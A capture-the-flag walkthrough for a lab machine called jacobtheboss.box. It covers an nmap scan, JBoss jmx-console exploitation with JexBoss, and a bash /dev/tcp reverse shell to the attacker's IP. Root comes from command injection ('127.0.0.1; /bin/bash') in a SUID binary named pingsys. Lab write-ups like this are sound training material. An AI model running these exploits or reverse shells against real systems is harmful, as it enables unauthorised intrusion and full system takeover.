@@ -1,0 +1,230 @@
+*First of all, add the jacobtheboss.box address to your hosts file.
+
+Start off by scanning the machine
+┌──(root💀kali)-[~]
+└─# nmap -sC -sV -T5 jacobtheboss.box
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-11 13:58 PDT
+Nmap scan report for jacobtheboss.box (10.10.115.83)
+Host is up (0.16s latency).
+Not shown: 987 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
+|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)
+|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)
+80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20
+|_http-title: My first blog
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+1090/tcp open  java-rmi    Java RMI
+|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
+1098/tcp open  java-rmi    Java RMI
+1099/tcp open  java-object Java Object Serialization
+| fingerprint-strings:
+|   NULL:
+|     java.rmi.MarshalledObject|
+|     hash[
+|     locBytest
+|     objBytesq
+|     http://jacobtheboss.box:8083/q
+|     org.jnp.server.NamingServer_Stub
+|     java.rmi.server.RemoteStub
+|     java.rmi.server.RemoteObject
+|     xpw;
+|     UnicastRef2
+|_    jacobtheboss.box
+3306/tcp open  mysql       MariaDB (unauthorized)
+4444/tcp open  java-rmi    Java RMI
+4445/tcp open  java-object Java Object Serialization
+4446/tcp open  java-object Java Object Serialization
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+| ajp-methods:
+|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
+|   Potentially risky methods: PUT DELETE TRACE
+|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+| http-methods:
+|_  Potentially risky methods: PUT DELETE TRACE
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Welcome to JBoss&trade;
+8083/tcp open  http        JBoss service httpd
+|_http-title: Site doesn't have a title (text/html).
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port1099-TCP:V=7.80%I=7%D=9/11%Time=5F5BE513%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
+SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
+SF:esq\0~\0\x01xp\xb8\xb3\xd6>ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02
+SF:\0\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0
+SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
+SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
+SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
+SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\
+SF:x10jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0\xc3\xf9\x9f\x83\0\0\x01t~
+SF:\xf6Ft\x80\0\0x");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port4445-TCP:V=7.80%I=7%D=9/11%Time=5F5BE519%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,4,"\xac\xed\0\x05");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port4446-TCP:V=7.80%I=7%D=9/11%Time=5F5BE519%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,4,"\xac\xed\0\x05");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 28.48 seconds
+
+Alot of port of port are open lets start with the webservers on 80 and 8080
+Port 80
+There is reference in the coments to a new content manager and a possible user jacob
+Powered by the service dotclear
+Let start enumerating the directory with gobuster and check out the server on 8080 while it runs
+
+Port 8080
+There appears to be two consoles available on this JBoss Application Server
+JMX Console and JBoss Web Console
+Past experience exploring java deserialization made me recall vulnerabilities with JBoss that are exploitable using JexBoss which can be found here https://github.com/joaomatosf/jexboss
+
+Exploitation with Jexboss
+
+┌──(root💀kali)-[/opt/jexboss]
+└─# python jexboss.py -u http://jacobtheboss.box:8080                                                           127 ⨯
+
+ * --- JexBoss: Jboss verify and EXploitation Tool  --- *
+ |  * And others Java Deserialization Vulnerabilities * |
+ |                                                      |
+ | @author:  João Filho Matos Figueiredo                |
+ | @contact: joaomatosf@gmail.com                       |
+ |                                                      |
+ | @update: https://github.com/joaomatosf/jexboss       |
+ #______________________________________________________#
+
+ @version: 1.2.4
+
+ * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **
+
+
+ ** Checking Host: http://jacobtheboss.box:8080 **
+
+ [*] Checking admin-console:                  [ OK ]
+ [*] Checking Struts2:                        [ OK ]
+ [*] Checking Servlet Deserialization:        [ OK ]
+ [*] Checking Application Deserialization:    [ OK ]
+ [*] Checking Jenkins:                        [ OK ]
+ [*] Checking web-console:                    [ VULNERABLE ]
+ [*] Checking jmx-console:                    [ VULNERABLE ]
+ [*] Checking JMXInvokerServlet:              [ VULNERABLE ]
+
+
+ * Do you want to try to run an automated exploitation via "web-console" ?
+   If successful, this operation will provide a simple command shell to execute
+   commands on the server..
+   Continue only if you have permission!
+   yes/NO? no
+
+
+ * Do you want to try to run an automated exploitation via "jmx-console" ?
+   If successful, this operation will provide a simple command shell to execute
+   commands on the server..
+   Continue only if you have permission!
+   yes/NO? yes
+
+ * Sending exploit code to http://jacobtheboss.box:8080. Please wait...
+
+ * Successfully deployed code! Starting command shell. Please wait...
+
+# ----------------------------------------- # LOL # ----------------------------------------- #
+
+ * http://jacobtheboss.box:8080:
+
+# ----------------------------------------- #
+
+ * For a Reverse Shell (like meterpreter =]), type the command:
+
+   jexremote=YOUR_IP:YOUR_PORT
+
+   Example:
+     Shell>jexremote=192.168.0.10:4444
+
+   Or use other techniques of your choice, like:
+     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1
+
+   And so on... =]
+
+# ----------------------------------------- #
+
+  Failed to check for updates
+Linux jacobtheboss.box 3.10.0-1127.18.2.el7.x86_64 #1 SMP Sun Jul 26 15:27:06 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+  Failed to check for updates
+\S
+Kernel \r on an \m
+
+  Failed to check for updates
+uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
+[Type commands or "exit" to finish]
+Shell>
+
+Just like that we are in lets ahed and nc ourselves a more stable shell to connect to
+┌──(root💀kali)-[~]
+└─# nc -nlvp 4242
+listening on [any] 4242 ...
+
+Shell> /bin/bash -i > /dev/tcp/10.13.1.12/4242 0>&1 2>&1
+
+From here we are in and can navigate to /home/Jacob to claim the user flag
+
+Privilege Escalation
+Begin by fixing our shell
+[jacob@jacobtheboss /]$ python -c "import pty;pty.spawn('/bin/bash')"
+python -c "import pty;pty.spawn('/bin/bash')"
+[jacob@jacobtheboss /]$ export TERM=xterm
+export TERM=xterm
+[jacob@jacobtheboss /]$
+
+We start by checking if we can find anything with sudo -l, no luck 
+cat /etc/crontab also reveals no cronjobs 
+Lastly time to check for SUID before we bring in linpeas to find out more
+[jacob@jacobtheboss ~]$ find / -type f -perm -4000 2>/dev/null
+find / -type f -perm -4000 2>/dev/null
+/usr/bin/pingsys
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/chage
+/usr/bin/umount
+/usr/bin/crontab
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/usernetctl
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+
+pingsys is not something I recognize being here but it is owned by root with a SUID bit set so lets look up an exploit
+
+[jacob@jacobtheboss /]$ /usr/bin/pingsys '127.0.0.1; /bin/bash'
+/usr/bin/pingsys '127.0.0.1; /bin/bash'
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.027 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.030 ms
+64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.027 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 2999ms
+rtt min/avg/max/mdev = 0.014/0.024/0.030/0.007 ms
+[root@jacobtheboss /]#
+
+once it finishes the ping command it then spawns a root shell and we are able to navigate to /root and claim the root flag
